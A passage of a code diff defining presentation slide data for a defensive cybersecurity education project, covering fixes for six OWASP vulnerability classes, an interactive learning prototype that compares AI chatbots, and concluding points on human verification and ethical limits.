+      "Conclusion: Prompting with explicit source text transforms AI into a dependable cybersecurity tutor."
+    ]
+  },
+  {
+    num: "05",
+    title: "Defensive Learning: Vulnerable vs Fixed Code",
+    subtitle: "Hands-on Code Review Lab Across 6 Vulnerability Classes",
+    bullets: [
+      "A01 Broken Access Control: Added server-side session ownership checks to prevent IDOR.",
+      "A02 Security Misconfiguration: Suppressed production stack trace dumps in Express middleware.",
+      "A03 Software Supply Chain: Enforced exact version pinning, lockfiles, and 'npm ci' verification.",
+      "A04 Cryptographic Failures: Replaced fast SHA-256 with memory-hard Argon2id adaptive hashing.",
+      "A05 Injection: Converted raw SQL string concatenation into parameterized prepared queries.",
+      "A07 Authentication Failures: Added IP rate limiting, generic error messages, and constant-time dummy verification."
+    ]
+  },
+  {
+    num: "06",
+    title: "Interactive Prototype & Automation Demo",
+    subtitle: "Live Web Application & Python Automation Pipeline",
+    bullets: [
+      "Full Interactive Web Prototype: Modern cybersecurity UI with 7 dedicated learning labs.",
+      "Interactive AI Comparison Lab: Real-time side-by-side comparison of ChatGPT, Gemini, and Claude.",
+      "Interactive 15-Question Quiz: Real-time scoring, instant explanations, and source links.",
+      "Python Automation Suite: One-click export script generating multi-sheet verification workbooks."
+    ]
+  },
+  {
+    num: "07",
+    title: "Conclusion, Limitations & Ethical Boundaries",
+    subtitle: "Defensive Principles and Human Verification in the Era of AI",
+    bullets: [
+      "Key Takeaway: AI is an exceptional learning accelerator, but unverified AI is a liability for secure coding.",
+      "Strict Defensive Boundaries: Zero offensive exploit scripts; all demos utilize synthetic test data.",
+      "Traceability is Mandatory: Every claim in curricula must map to official standards (OWASP, NIST).",
+      "Next Steps: Expand evaluation to full 10 categories and automate real-time model auditing."
+    ]
+  }
+];
